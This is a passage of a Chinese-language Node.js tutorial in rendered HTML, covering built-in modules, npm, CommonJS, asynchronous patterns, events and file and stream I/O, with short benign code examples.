class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Inside Timeout&#x27;</span>);<br>&#125;, <span class="hljs-number">1000</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;End&#x27;</span>);<br><br><span class="hljs-comment">// 输出顺序：</span><br><span class="hljs-comment">// Start</span><br><span class="hljs-comment">// End</span><br><span class="hljs-comment">// Inside Timeout</span><br></code></pre></td></tr></table></figure><h3 id="1-4-Node-js-与-JavaScript-的区别"><a href="#1-4-Node-js-与-JavaScript-的区别" class="headerlink" title="1.4 Node.js 与 JavaScript 的区别"></a>1.4 Node.js 与 JavaScript 的区别</h3><p>Node.js 和 JavaScript 都使用同样的语言语法，但它们的运行环境和使用场景不同：</p><ul><li><strong>JavaScript</strong> 主要运行在浏览器中，用于操控 DOM 和处理前端交互。</li><li><strong>Node.js</strong> 运行在服务器端，用于构建后端应用程序和处理 I&#x2F;O 操作。</li></ul><p>Node.js 提供了许多 JavaScript 在浏览器中没有的模块，如 <code>fs</code> (文件系统模块)、<code>http</code> (HTTP 模块)、<code>net</code> (网络模块) 等。</p><hr><h2 id="2-模块与包管理-1"><a href="#2-模块与包管理-1" class="headerlink" title="2. 模块与包管理"></a>2. 模块与包管理</h2><h3 id="2-1-Node-js-内置模块"><a href="#2-1-Node-js-内置模块" class="headerlink" title="2.1 Node.js 内置模块"></a>2.1 Node.js 内置模块</h3><p>Node.js 提供了一系列内置模块，允许开发者处理常见的任务，如文件操作、网络请求等。</p><h4 id="2-1-1-fs-文件系统模块"><a href="#2-1-1-fs-文件系统模块" class="headerlink" title="2.1.1 fs 文件系统模块"></a>2.1.1 <code>fs</code> 文件系统模块</h4><p><code>fs</code> 模块用于处理文件系统的操作，包括读取、写入文件和管理文件夹。</p><p><strong>读取文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-1-2-http-模块"><a href="#2-1-2-http-模块" class="headerlink" title="2.1.2 http 模块"></a>2.1.2 <code>http</code> 模块</h4><p><code>http</code> 模块用于创建 HTTP 服务器和处理请求&#x2F;响应。</p><p><strong>创建简单的 HTTP 服务器：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="2-1-3-path-模块"><a href="#2-1-3-path-模块" class="headerlink" title="2.1.3 path 模块"></a>2.1.3 <code>path</code> 模块</h4><p><code>path</code> 模块用于处理和规范化文件路径。</p><p><strong>获取文件的扩展名：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><br><span class="hljs-keyword">const</span> ext = path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ext); <span class="hljs-comment">// 输出: .txt</span><br></code></pre></td></tr></table></figure><h4 id="2-1-4-os-模块"><a href="#2-1-4-os-模块" class="headerlink" title="2.1.4 os 模块"></a>2.1.4 <code>os</code> 模块</h4><p><code>os</code> 模块提供与操作系统相关的实用函数和属性。</p><p><strong>获取系统的内存信息：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Total Memory: <span class="hljs-subst">$&#123;os.totalmem()&#125;</span> bytes`</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Free Memory: <span class="hljs-subst">$&#123;os.freemem()&#125;</span> bytes`</span>);<br></code></pre></td></tr></table></figure><h4 id="2-1-5-crypto-模块"><a href="#2-1-5-crypto-模块" class="headerlink" title="2.1.5 crypto 模块"></a>2.1.5 <code>crypto</code> 模块</h4><p><code>crypto</code> 模块提供了加密操作的功能，用于生成哈希、加密和解密数据。</p><p><strong>生成 SHA256 哈希：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> hash = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>).<span class="hljs-title function_">update</span>(<span class="hljs-string">&#x27;password&#x27;</span>).<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(hash);<br></code></pre></td></tr></table></figure><h3 id="2-2-使用-NPM-和包管理"><a href="#2-2-使用-NPM-和包管理" class="headerlink" title="2.2 使用 NPM 和包管理"></a>2.2 使用 NPM 和包管理</h3><p>NPM 是 Node.js 的包管理器，允许开发者安装、管理和分享第三方库。</p><h4 id="2-2-1-NPM-的安装和使用"><a href="#2-2-1-NPM-的安装和使用" class="headerlink" title="2.2.1 NPM 的安装和使用"></a>2.2.1 NPM 的安装和使用</h4><p>在安装 Node.js 时，NPM 会自动安装。你可以使用以下命令检查是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm -v<br></code></pre></td></tr></table></figure><h4 id="2-2-2-管理项目依赖"><a href="#2-2-2-管理项目依赖" class="headerlink" title="2.2.2 管理项目依赖"></a>2.2.2 管理项目依赖</h4><p><strong>安装依赖包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure><p><strong>卸载依赖包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm uninstall express<br></code></pre></td></tr></table></figure><h4 id="2-2-3-版本控制与语义化版本"><a href="#2-2-3-版本控制与语义化版本" class="headerlink" title="2.2.3 版本控制与语义化版本"></a>2.2.3 版本控制与语义化版本</h4><p>NPM 使用语义化版本控制 (SemVer)，版本号格式为 <code>MAJOR.MINOR.PATCH</code>：</p><ul><li><strong>MAJOR</strong>：有重大更改或破坏兼容性时增加。</li><li><strong>MINOR</strong>：添加新功能但不破坏兼容性时增加。</li><li><strong>PATCH</strong>：修复 bug 且不破坏兼容性时增加。</li></ul><h4 id="2-2-4-使用-package-json-管理项目"><a href="#2-2-4-使用-package-json-管理项目" class="headerlink" title="2.2.4 使用 package.json 管理项目"></a>2.2.4 使用 <code>package.json</code> 管理项目</h4><p><code>package.json</code> 是 Node.js 项目配置文件，用于定义项目的依赖、脚本、版本号等。</p><p><strong>生成 <code>package.json</code> 文件：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm init<br></code></pre></td></tr></table></figure><p><strong>示例 <code>package.json</code> 文件：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-app&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.0.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;start&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node app.js&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;dependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;express&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^4.17.1&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-3-自定义模块与-CommonJS-规范"><a href="#2-3-自定义模块与-CommonJS-规范" class="headerlink" title="2.3 自定义模块与 CommonJS 规范"></a>2.3 自定义模块与 CommonJS 规范</h3><h4 id="2-3-1-导入与导出模块"><a href="#2-3-1-导入与导出模块" class="headerlink" title="2.3.1 导入与导出模块"></a>2.3.1 导入与导出模块</h4><p>Node.js 遵循 <strong>CommonJS 模块规范</strong>，通过 <code>module.exports</code> 导出模块，通过 <code>require</code> 导入模块。</p><p><strong>导出模块：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// file: math.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">add</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b;<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">subtract</span> = <span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b;<br></code></pre></td></tr></table></figure><p><strong>导入模块：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./math&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>));  <span class="hljs-comment">// 输出: 5</span><br></code></pre></td></tr></table></figure><h4 id="2-3-2-CommonJS-和-ES6-模块的区别"><a href="#2-3-2-CommonJS-和-ES6-模块的区别" class="headerlink" title="2.3.2 CommonJS 和 ES6 模块的区别"></a>2.3.2 CommonJS 和 ES6 模块的区别</h4><ul><li><strong>CommonJS</strong> 是 Node.js 的默认模块系统，使用 <code>require</code> 和 <code>module.exports</code>。</li><li><strong>ES6 模块</strong> 使用 <code>import</code> 和 <code>export</code> 语法，在 Node.js 中也逐渐被支持，需要在 <code>package.json</code> 中添加 <code>&quot;type&quot;: &quot;module&quot;</code>。</li></ul><hr><h2 id="3-异步编程-1"><a href="#3-异步编程-1" class="headerlink" title="3. 异步编程"></a>3. 异步编程</h2><h3 id="3-1-异步编程基础"><a href="#3-1-异步编程基础" class="headerlink" title="3.1 异步编程基础"></a>3.1 异步编程基础</h3><p>Node.js 的异步编程是其核心特点，允许程序在执行耗时任务时继续处理其他任务。</p><h4 id="3-1-1-回调函数"><a href="#3-1-1-回调函数" class="headerlink" title="3.1.1 回调函数"></a>3.1.1 回调函数</h4><p>回调函数是最基础的异步处理方式，将一个函数作为参数传递给另一个函数，在异步任务完成后调用该回调函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="3-1-2-Promise-对象"><a href="#3-1-2-Promise-对象" class="headerlink" title="3.1.2 Promise 对象"></a>3.1.2 <code>Promise</code> 对象</h4><p><code>Promise</code> 是一种更现代的异步处理方式，可以避免回调地狱问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err));<br></code></pre></td></tr></table></figure><h4 id="3-1-3-async-await-语法"><a href="#3-1-3-async-await-语法" class="headerlink" title="3.1.3 async/await 语法"></a>3.1.3 <code>async/await</code> 语法</h4><p><code>async/await</code> 是基于 <code>Promise</code> 的语法糖，能够以同步的写法处理异步任务。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-property">promises</span>;<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readFile</span>(<span class="hljs-params"></span>) &#123;<br> <br><br> <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">readFile</span>();<br></code></pre></td></tr></table></figure><h3 id="3-2-事件驱动编程"><a href="#3-2-事件驱动编程" class="headerlink" title="3.2 事件驱动编程"></a>3.2 事件驱动编程</h3><p>Node.js 的事件驱动编程通过 <strong>事件循环</strong> 和 <strong>事件发射器</strong> (<code>EventEmitter</code>) 实现。</p><h4 id="3-2-1-使用-EventEmitter"><a href="#3-2-1-使用-EventEmitter" class="headerlink" title="3.2.1 使用 EventEmitter"></a>3.2.1 使用 <code>EventEmitter</code></h4><p><code>EventEmitter</code> 是 Node.js 的核心类，用于创建和监听事件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EventEmitter</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;events&#x27;</span>);<br><span class="hljs-keyword">const</span> emitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventEmitter</span>();<br><br>emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;event&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Event has occurred!&#x27;</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;event&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="3-2-2-自定义事件处理"><a href="#3-2-2-自定义事件处理" class="headerlink" title="3.2.2 自定义事件处理"></a>3.2.2 自定义事件处理</h4><p>你可以自定义事件，事件可以传递参数供监听器处理。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">emitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">name</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-3-异步控制流管理"><a href="#3-3-异步控制流管理" class="headerlink" title="3.3 异步控制流管理"></a>3.3 异步控制流管理</h3><h4 id="3-3-1-async-js-库的使用"><a href="#3-3-1-async-js-库的使用" class="headerlink" title="3.3.1 async.js 库的使用"></a>3.3.1 <code>async.js</code> 库的使用</h4><p><code>async.js</code> 是一个控制异步流程的库，提供了多种控制异步任务的方式，如并行、串行等。</p><p><strong>并行执行异步任务：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">async</span>.<span class="hljs-title function_">parallel</span>([<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 1&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">1</span>);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;,<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 2&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>    &#125;, <span class="hljs-number">500</span>);<br>  &#125;<br>], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);  <span class="hljs-comment">// 输出: [1, 2]</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="3-3-2-异步队列与并发控制"><a href="#3-3-2-异步队列与并发控制" class="headerlink" title="3.3.2 异步队列与并发控制"></a>3.3.2 异步队列与并发控制</h4><p><code>async.queue</code> 提供了一种控制并发执行任务的方式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">const</span> q = <span class="hljs-keyword">async</span>.<span class="hljs-title function_">queue</span>(<span class="hljs-function">(<span class="hljs-params">task, callback</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Processing task <span class="hljs-subst">$&#123;task.name&#125;</span>`</span>);<br>  <span class="hljs-title function_">callback</span>();<br>&#125;, <span class="hljs-number">2</span>);  <span class="hljs-comment">// 最大并发数为 2</span><br><br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 1&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 2&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 3&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="4-文件操作与-I-O-1"><a href="#4-文件操作与-I-O-1" class="headerlink" title="4. 文件操作与 I&#x2F;O"></a>4. 文件操作与 I&#x2F;O</h2><h3 id="4-1-文件系统操作"><a href="#4-1-文件系统操作" class="headerlink" title="4.1 文件系统操作"></a>4.1 文件系统操作</h3><p>Node.js 的 <code>fs</code> 模块用于与文件系统交互，可以读取、写入文件以及管理目录。它支持同步和异步操作。</p><h4 id="4-1-1-读取与写入文件"><a href="#4-1-1-读取与写入文件" class="headerlink" title="4.1.1 读取与写入文件"></a>4.1.1 读取与写入文件</h4><p><strong>异步读取文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>同步读取文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br></code></pre></td></tr></table></figure><p><strong>写入文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> content = <span class="hljs-string">&#x27;This is a new content.&#x27;</span>;<br>fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, content, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;File written successfully.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-1-2-文件流与大文件处理"><a href="#4-1-2-文件流与大文件处理" class="headerlink" title="4.1.2 文件流与大文件处理"></a>4.1.2 文件流与大文件处理</h4><p>对于大文件，使用流处理更高效，因为流分块读取文件，而不是将整个文件读入内存。</p><p><strong>读取文件流：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> readStream = fs.<span class="hljs-title function_">createReadStream</span>(<span class="hljs-string">&#x27;largeFile.txt&#x27;</span>, &#123; <span class="hljs-attr">encoding</span>: <span class="hljs-string">&#x27;utf8&#x27;</span> &#125;);<br>readStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Received chunk: <span class="hljs-subst">$&#123;chunk&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>写入文件流：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> writeStream = fs.<span class="hljs-title function_">createWriteStream</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>);<br><br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;First chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;Second chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;End of writing process.&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="4-2-网络-I-O-操作"><a href="#4-2-网络-I-O-操作" class="headerlink" title="4.2 网络 I&#x2F;O 操作"></a>4.2 网络 I&#x2F;O 操作</h3><p>Node.js 提供了丰富的网络操作模块，特别适合处理高并发的网络应用。</p><h4 id="4-2-1-创建-HTTP-服务器"><a href="#4-2-1-创建-HTTP-服务器" class="headerlink" title="4.2.1 创建 HTTP 服务器"></a>4.2.1 创建 HTTP 服务器</h4><p>Node.js 的 <code>http</code> 模块可以用于创建 HTTP 服务器，处理客户端请求和响应。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span 